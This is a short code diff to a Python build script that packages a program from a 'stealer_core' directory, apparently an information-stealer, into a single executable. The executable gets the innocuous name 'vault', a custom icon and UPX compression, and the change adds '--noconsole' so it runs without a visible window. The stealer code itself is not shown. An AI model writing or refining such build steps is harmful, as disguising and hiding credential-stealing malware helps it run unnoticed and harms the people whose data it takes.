@@ -112,7 +112,7 @@ def build():
     os.system("pyinstaller --version")
     os.system("pyinstaller --help")
     print(f"{Fore.LIGHTBLUE_EX}[Pyinstaller]{Fore.RESET} Start Build Process")
-    os.system('pyinstaller --onefile --clean --name="vault" --icon=src/ico.ico --upx-dir=src/upx src/stealer_core/src.py')
+    os.system('pyinstaller --onefile --clean --noconsole --name="vault" --icon=src/ico.ico --upx-dir=src/upx src/stealer_core/src.py')
     print(f"{Fore.LIGHTBLUE_EX}[Pyinstaller]{Fore.RESET} Build Finished.")
 
 def main():
